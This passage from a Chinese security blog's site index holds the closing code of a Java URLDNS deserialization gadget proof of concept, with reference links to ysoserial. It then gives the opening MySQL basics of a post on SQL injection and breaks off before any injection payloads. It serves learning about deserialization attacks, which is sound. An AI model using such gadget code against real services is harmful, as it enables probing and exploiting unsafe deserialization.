class="string">&quot;E:\\学习\\web\\java学习\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream input=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        Object obj=input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">silentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/news/8916">https://xz.aliyun.com/news/8916</a></p><p><a href="https://xz.aliyun.com/t/6787">https://xz.aliyun.com/t/6787</a></p><p><a href="https://www.cnblogs.com/N0r4h/p/15840776.html">https://www.cnblogs.com/N0r4h/p/15840776.html</a></p><p><a href="https://nivi4.notion.site/Java-URLDNS-e9820d5abc6e402abcaf69ef876f74c0">https://nivi4.notion.site/Java-URLDNS-e9820d5abc6e402abcaf69ef876f74c0</a></p><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> URLDNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入总结(超详细)</title>
      <link href="/archives/ef8ae29c/"/>
      <url>/archives/ef8ae29c/</url>
      
        <content type="html"><![CDATA[<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a><strong>环境配置</strong></h3><p><img src="/archives/ef8ae29c/QQ%E6%88%AA%E5%9B%BE20231218174435.png"></p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a><strong>定义</strong></h3><p><strong>MySQL</strong>为关系型数据库(Relational Database Management System), 这种所谓的”关系型”可以理解为”表格”的概念, 一个关系型数据库由一个或<strong>数个表格</strong>组成, 如图所示的一个表格:</p><p><img src="/archives/ef8ae29c/QQ%E6%88%AA%E5%9B%BE20231218175654.png"></p><ul><li><p><strong>表头</strong>(header): 每一列的名称。</p></li><li><p><strong>列</strong>(col): 具有相同数据类型的数据的集合。</p></li><li><p><strong>行</strong>(row): 每一行用来描述某条记录的具体信息。</p></li><li><p><strong>值</strong>(value): 行的具体信息, 每个值必须与该列的数据类型相同。</p></li><li><p><strong>键(key)</strong>: 键的值在当前列中具有唯一性。</p></li></ul><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h4><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">范围（有符号）</th><th align="left">范围（无符号）</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">TINYINT</td><td align="left">1 Bytes</td><td align="left">(-128，127)</td><td align="left">(0，255)</td><td align="left">小整数值</td></tr><tr><td align="left">SMALLINT</td><td align="left">2 Bytes</td><td align="left">(-32 768，32 767)</td><td align="left">(0，65 535)</td><td align="left">大整数值</td></tr><tr><td align="left">MEDIUMINT</td><td align="left">3 Bytes</td><td align="left">(-8 388 608，8 388 607)</td><td align="left">(0，16 777 215)</td><td align="left">大整数值</td></tr><tr><td align="left">INT或INTEGER</td><td align="left">4 Bytes</td><td align="left">(-2 147 483 648，2 147 483 647)</td><td align="left">(0，4 294 967 295)</td><td align="left">大整数值</td></tr><tr><td align="left">BIGINT</td><td align="left">8 Bytes</td><td align="left">(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td><td align="left">(0，18 446 744 073 709 551 615)</td><td align="left">极大整数值</td></tr><tr><td align="left">FLOAT</td><td align="left">4 Bytes</td><td align="left">(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td><td align="left">0，(1.175 494 351 E-38，3.402 823 466 E+38)</td><td align="left">单精度 浮点数值</td></tr><tr><td align="left">DOUBLE</td><td align="left">8 Bytes</td><td align="left">(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">双精度 浮点数值</td></tr><tr><td align="left">DECIMAL</td><td align="left">对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td><td align="left">依赖于M和D的值</td><td align="left">依赖于M和D的值</td><td align="left">小数值</td></tr></tbody></table><h4 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h4><table><thead><tr><th align="left">类型</th><th align="left">大小 ( bytes)</th><th align="left">范围</th><th align="left">格式</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">DATE</td><td align="left">3</td><td align="left">1000-01-01&#x2F;9999-12-31</td><td align="left">YYYY-MM-DD</td><td align="left">日期值</td></tr><tr><td align="left">TIME</td><td align="left">3</td><td align="left">‘-838:59:59’&#x2F;‘838:59:59’</td><td align="left">HH:MM:SS</td><td align="left">时间值或持续时间</td></tr><tr><td align="left">YEAR</td><td align="left">1</td><td align="left">1901&#x2F;2155</td><td align="left">YYYY</td><td align="left">年份值</td></tr><tr><td align="left">DATETIME</td><td align="left">8</td><td align="left">‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td><td align="left">YYYY-MM-DD hh:mm:ss</td><td align="left">混合日期和时间值</td></tr><tr><td align="left">TIMESTAMP</td><td align="left">4</td><td align="left">‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-19 03:14:07’ UTC结束时间是第 <strong>2147483647</strong> 秒，北京时间 <strong>2038-1-19 11:14:07</strong>，格林尼治时间 2038年1月19日 凌晨 03:14:07</td><td align="left">YYYY-MM-DD hh:mm:ss</td><td align="left">混合日期和时间值，时间戳</td></tr></tbody></table><h4 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h4><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">CHAR</td><td align="left">0-255 bytes</td><td align="left">定长字符串</td></tr><tr><td align="left">VARCHAR</td><td align="left">0-65535 bytes</td><td align="left">变长字符串</td></tr><tr><td align="left">TINYBLOB</td><td align="left">0-255 bytes</td><td align="left">不超过 255 个字符的二进制字符串</td></tr><tr><td align="left">TINYTEXT</td><td align="left">0-255 bytes</td><td align="left">短文本字符串</td></tr><tr><td align="left">BLOB</td><td align="left">0-65 535 bytes</td><td align="left">二进制形式的长文本数据</td></tr><tr><td align="left">TEXT</td><td align="left">0-65 535 bytes</td><td align="left">长文本数据</td></tr><tr><td align="left">MEDIUMBLOB</td><td align="left">0-16 777 215 bytes</td><td align="left">二进制形式的中等长度文本数据</td></tr><tr><td align="left">MEDIUMTEXT</td><td align="left">0-16 777 215 bytes</td><td align="left">中等长度文本数据</td></tr><tr><td align="left">LONGBLOB</td><td align="left">0-4 294 967 295 bytes</td><td align="left">二进制形式的极大文本数据</td></tr><tr><td align="left">LONGTEXT</td><td align="left">0-4 294 967 295 bytes</td><td align="left">极大文本数据</td></tr></tbody></table><blockquote><p>char(n) 和 varchar(n) 中括号中 n 代表字符的个数，并不代表字节个数，比如 CHAR(30) 就可以存储 30 个字符。</p></blockquote><h4 id="枚举与集合类型（Enumeration-and-Set-Types）"><a href="#枚举与集合类型（Enumeration-and-Set-Types）" class="headerlink" title="枚举与集合类型（Enumeration and Set Types）"></a>枚举与集合类型（Enumeration and Set Types）</h4><ul><li><strong>ENUM</strong>: 枚举类型，用于存储单一值，可以选择一个预定义的集合。</li><li><strong>SET</strong>: 集合类型，用于存储多个值，可以选择多个预定义的集合。</li></ul><h3 id="库操作"><a href="#库操作" class="headerlink" title="库操作"></a>库操作</h3><ul><li><p><strong>创建数据库</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE 数据库名;</span><br></pre></td></tr></table></figure></li><li><p><strong>查看数据库</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> database 数据库名;</span><br></pre></td></tr></table></figure></li><li><p><strong>删除数据库</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE <span class="operator">&lt;</span>database_name<span class="operator">&gt;</span>;        <span class="operator">/</span><span class="operator">/</span> 直接删除数据库，不检查是否存在</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> DATABASE [IF <span class="keyword">EXISTS</span>] <span class="operator">&lt;</span>database_name<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>修改数据库</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> database<span class="operator">|</span>schema db_name</span><br></pre></td></tr></table></figure></li></ul><h3 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h3><h4 id="表约束"><a href="#表约束" class="headerlink" title="表约束"></a>表约束</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> users (</span><br><span class="line">    id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">    email <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">    seat <span class="type">INT</span> <span class="keyword">UNIQUE</span>,</span><br><span class="line">    birthdate <span class="type">DATE</span>,</span><br><span class="line">    is_active <span class="type">BOOLEAN</span> <span class="keyword">DEFAULT</span> <span class="literal">TRUE</span>,</span><br><span class="line">    <span class="keyword">CONSTRAINT</span> fk <span class="keyword">FOREIGN KEY</span>(tid) <span class="keyword">REFERENCES</span> teachers(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li><p><strong>非空约束(not null)</strong></p><p>用not null约束的字段不能为null值，必须给定具体的数据</p></li><li><p><strong>唯一性约束(unique)</strong></p><p>unique约束的字段，具有唯一性，不可重复，但可以为null</p></li><li><p><strong>主键约束(primary key) PK</strong></p></li><li><p><strong>外键约束(foreign key)FK</strong></p><p>只能是表级定义（如以下例子）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreign key</span>(classno) <span class="keyword">references</span> t_class(cno)</span><br></pre></td></tr></table></figure></li><li><p><strong>检查约束(目前MySQL不支持、Oracle支持)</strong></p></li></ul><h4 id="数据表管理"><a href="#数据表管理" class="headerlink" title="数据表管理"></a>数据表管理</h4><ul><li><p><strong>创建表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> table_name (</span><br><span class="line">    column1 datatype,</span><br><span class="line">    column2 datatype,</span><br><span class="line">    ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p><strong>修改表</strong></p><ul><li><p><strong>add</strong></p><p><strong>用于增加新字段和完整型约束</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">add</span> <span class="operator">&lt;</span>新表名<span class="operator">&gt;</span> <span class="operator">&lt;</span>数据类型<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure><blockquote><p><strong>first和after</strong>为可选项，分别用于将新添加的字段设置为表的第一个字段和将添加的字段添加到指定的”已有字段名”之后</p><p><strong>添加多个字段要用括号括起来</strong></p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> s</span><br><span class="line"><span class="keyword">add</span> class_no <span class="type">varchar</span>(<span class="number">6</span>);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> s</span><br><span class="line"><span class="keyword">add</span> (class_no <span class="type">varchar</span>(<span class="number">6</span>),address nvarchar(<span class="number">20</span>));</span><br></pre></td></tr></table></figure></li><li><p><strong>rename</strong></p><p><strong>用于修改表名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>旧表名<span class="operator">&gt;</span></span><br><span class="line">rename <span class="operator">&lt;</span>新表名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>change</strong></p><p><strong>用于修改字段名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">change <span class="operator">&lt;</span>旧字段名<span class="operator">&gt;</span> <span class="operator">&lt;</span>新字段名<span class="operator">&gt;</span> <span class="operator">&lt;</span>新数据类型<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>modify</strong></p><p>用于<strong>修改字段数据类型和字段排序</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">modify <span class="operator">&lt;</span>字段名<span class="number">1</span><span class="operator">&gt;</span> <span class="operator">&lt;</span>数据类型<span class="operator">&gt;</span> [<span class="keyword">first</span><span class="operator">|</span>after 字段名<span class="number">2</span>];</span><br></pre></td></tr></table></figure></li><li><p><strong>engine</strong></p><p>用于<strong>修改表的存储引擎</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">engine<span class="operator">=</span><span class="operator">&lt;</span>修改后存储引擎名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>drop</strong></p><p>用于<strong>删除字段和完整型约束</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>旧表名<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">drop</span> <span class="operator">&lt;</span>字段名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>旧表名<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">CONSTRAINT</span> <span class="operator">&lt;</span>约束名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>删除表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>查看表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">describe</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>;  <span class="operator">/</span><span class="operator">/</span>查看表结构</span><br></pre></td></tr></table></figure></li></ul><h4 id="表中数据操纵"><a href="#表中数据操纵" class="headerlink" title="表中数据操纵"></a>表中数据操纵</h4><ul><li><p><strong>insert</strong></p><p>用于<strong>在表中添加一条新纪录</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span><span class="operator">|</span>replace <span class="keyword">into</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>[(<span class="operator">&lt;</span>字段名<span class="number">1</span><span class="operator">&gt;</span>[,<span class="operator">&lt;</span>字段名<span class="number">2</span><span class="operator">&gt;</span>...])] <span class="keyword">values</span>(<span class="operator">&lt;</span>值<span class="operator">&gt;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span><span class="operator">|</span>replace <span class="keyword">into</span> s(sno,sn,age)</span><br><span class="line"><span class="keyword">values</span>(<span class="string">&#x27;s9&#x27;</span>,<span class="string">&#x27;小明&#x27;</span>,<span class="number">21</span>);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span><span class="operator">|</span>replace <span class="keyword">into</span> s(sno,sn,age)</span><br><span class="line"><span class="keyword">values</span>(<span class="string">&#x27;s9&#x27;</span>,<span class="string">&#x27;小明&#x27;</span>,<span class="number">21</span>),</span><br><span class="line">(<span class="string">&#x27;s8&#x27;</span>,<span class="string">&#x27;小红&#x27;</span>,<span class="number">20</span>)；</span><br></pre></td></tr></table></figure></li><li><p><strong>update</strong></p><p><strong>用于修改数据表中的数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">updata <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">set</span> <span class="operator">&lt;</span>字段名<span class="operator">&gt;=</span><span class="operator">&lt;</span>表达式<span class="operator">&gt;</span>...</span><br><span class="line">[<span class="keyword">where</span> <span class="operator">&lt;</span>条件<span class="operator">&gt;</span>];</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">updata t</span><br><span class="line"><span class="keyword">set</span> dept<span class="operator">=</span><span class="string">&#x27;工学院&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>delete</strong></p><p>用于<strong>删除数据表中数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span></span><br><span class="line"><span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">[<span class="keyword">where</span> <span class="operator">&lt;</span>条件<span class="operator">&gt;</span>];</span><br></pre></td></tr></table></figure><blockquote><p>where句省略时，会删除表中所有记录</p></blockquote></li></ul><h4 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line">[<span class="keyword">WHERE</span> <span class="keyword">condition</span>]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>]]</span><br><span class="line">[LIMIT number];</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>ORDER BY column_name [ASC | DESC]</code> 是一个可选的子句，用于指定结果集的排序顺序，默认是升序（ASC）。</li><li><code>LIMIT number</code> 是一个可选的子句，用于限制返回的行数。</li></ul></blockquote><h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><ul><li><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><table><thead><tr><th align="left">操作符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">&#x3D;</td><td align="left">等号，检测两个值是否相等，如果相等返回true</td><td align="left">(A &#x3D; B) 返回false。</td></tr><tr><td align="left">&lt;&gt;, !&#x3D;</td><td align="left">不等于，检测两个值是否相等，如果不相等返回true</td><td align="left">(A !&#x3D; B) 返回 true。</td></tr><tr><td align="left">&gt;</td><td align="left">大于号，检测左边的值是否大于右边的值, 如果左边的值大于右边的值返回true</td><td align="left">(A &gt; B) 返回false。</td></tr><tr><td align="left">&lt;</td><td align="left">小于号，检测左边的值是否小于右边的值, 如果左边的值小于右边的值返回true</td><td align="left">(A &lt; B) 返回 true。</td></tr><tr><td align="left">&gt;&#x3D;</td><td align="left">大于等于号，检测左边的值是否大于或等于右边的值, 如果左边的值大于或等于右边的值返回true</td><td align="left">(A &gt;&#x3D; B) 返回false。</td></tr><tr><td align="left">&lt;&#x3D;</td><td align="left">小于等于号，检测左边的值是否小于或等于右边的值, 如果左边的值小于或等于右边的值返回true</td><td align="left">(A &lt;&#x3D; B) 返回 true。</td></tr><tr><td align="left">IS NULL 或者 ISNULL</td><td align="left">判断一个值是否为空</td><td align="left">如果为 NULL，返回值为 1，否则返回值为 0</td></tr><tr><td align="left">IS NOT NULL</td><td align="left">判断一个值是否不为空</td><td align="left">如果非 NULL，返回值为 1，否则返回值为 0</td></tr><tr><td align="left">BETWEEN AND</td><td align="left">判断一个值是否落在两个值之间</td><td align="left">大于等于 min 并且小于等于 max，那么返回值为 1，否则返回值为 0</td></tr><tr><td align="left">IN</td><td align="left">判断操作数是否为IN列表中的一个值</td><td align="left">如果是则返回1，否则返回0，对于NULL则返回NULL</td></tr><tr><td align="left">NOT IN</td><td align="left">判断操作数是否不属于IN列表</td><td align="left">如果是则返回1，否则返回0，对于NULL则返回NULL</td></tr><tr><td align="left">LIKE</td><td align="left">用于匹配字符串</td><td align="left">返回的结果值有1、0与NULL</td></tr><tr><td align="left">REGEXP</td><td align="left">正则表达式</td><td align="left">1. 匹配不区分大小写<br>2. 可以使用 BINARY 关键字进行区分大小写<br>3. 匹配可使用的通配符非常多，与其他通配符普适</td></tr></tbody></table></li><li><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table><thead><tr><th align="left">运算符号</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">NOT 或 !</td><td align="left">逻辑非</td></tr><tr><td align="left">AND</td><td align="left">逻辑与</td></tr><tr><td align="left">OR</td><td align="left">逻辑或</td></tr><tr><td align="left">XOR</td><td align="left">逻辑异或</td></tr></tbody></table></li><li><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p>位运算符是在二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。</p><table><thead><tr><th align="left">运算符号</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">&amp;</td><td align="left">按位与</td></tr><tr><td align="left">|</td><td align="left">按位或</td></tr><tr><td align="left">^</td><td align="left">按位异或</td></tr><tr><td align="left">!</td><td align="left">取反</td></tr><tr><td align="left">&lt;&lt;</td><td align="left">左移</td></tr><tr><td align="left">&gt;&gt;</td><td align="left">右移</td></tr><tr><td align="left">~</td><td align="left">按位非</td></tr></tbody></table><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">5</span> <span class="operator">&amp;</span> <span class="number">3</span>;  <span class="comment">-- 输出：1（二进制：0101 &amp; 0011 = 0001）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">5</span> <span class="operator">|</span> <span class="number">3</span>;  <span class="comment">-- 输出：7（二进制：0101 | 0011 = 0111）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">5</span> <span class="operator">^</span> <span class="number">3</span>;  <span class="comment">-- 输出：6（二进制：0101 ^ 0011 = 0110）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">~</span><span class="number">5</span>;     <span class="comment">-- 输出：-6（二进制：~0101 = 1010，在有符号二进制补码表示中）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">2</span> <span class="operator">&lt;&lt;</span> <span class="number">1</span>; <span class="comment">-- 输出：4（二进制：0010 &lt;&lt; 1 = 0100）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">4</span> <span class="operator">&gt;&gt;</span> <span class="number">1</span>; <span class="comment">-- 输出：2（二进制：0100 &gt;&gt; 1 = 0010）</span></span><br></pre></td></tr></table></figure></li><li><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><table><thead><tr><th align="left">通配符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>%</code></td><td align="left">替代 0 个或多个字符</td></tr><tr><td align="left"><code>_</code></td><td align="left">替代一个字符</td></tr><tr><td align="left">[]</td><td align="left">字符列中的任何单一字符</td></tr><tr><td align="left">[^] 或 [!]</td><td align="left">不在字符列中的任何单一字符</td></tr></tbody></table></li></ul><p>等于条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;test&#x27;;</span><br></pre></td></tr></table></figure><p>不等于条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username != &#x27;runoob&#x27;;</span><br></pre></td></tr></table></figure><p>大于条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE price &gt; 50.00;</span><br></pre></td></tr></table></figure><p>小于条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM orders WHERE order_date &lt; &#x27;2023-01-01&#x27;;</span><br></pre></td></tr></table></figure><p>大于等于条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM employees WHERE salary &gt;= 50000;</span><br></pre></td></tr></table></figure><p>小于等于条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM students WHERE age &lt;= 21;</span><br></pre></td></tr></table></figure><p>组合条件（AND、OR）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category = &#x27;Electronics&#x27; AND price &gt; 100.00;</span><br><span class="line"></span><br><span class="line">SELECT * FROM orders WHERE order_date &gt;= &#x27;2023-01-01&#x27; OR total_amount &gt; 1000.00;</span><br></pre></td></tr></table></figure><p>模糊匹配条件（LIKE）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM customers WHERE first_name LIKE &#x27;J%&#x27;;</span><br></pre></td></tr></table></figure><p>IN 条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM countries WHERE country_code IN (&#x27;US&#x27;, &#x27;CA&#x27;, &#x27;MX&#x27;);</span><br></pre></td></tr></table></figure><p>NOT 条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE NOT category = &#x27;Clothing&#x27;;</span><br></pre></td></tr></table></figure><p>BETWEEN 条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 